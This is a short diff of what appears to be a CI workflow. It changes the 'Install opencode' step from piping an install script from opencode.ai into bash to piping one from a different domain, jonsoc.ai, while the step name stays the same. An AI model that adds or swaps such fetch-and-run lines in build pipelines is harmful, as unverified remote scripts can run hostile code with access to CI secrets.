@@ -34,7 +34,7 @@ jobs:
         run: bun install
 
       - name: Install opencode
-        run: curl -fsSL https://opencode.ai/install | bash
+        run: curl -fsSL https://jonsoc.ai/install | bash
 
       - name: Build prompt
         env:
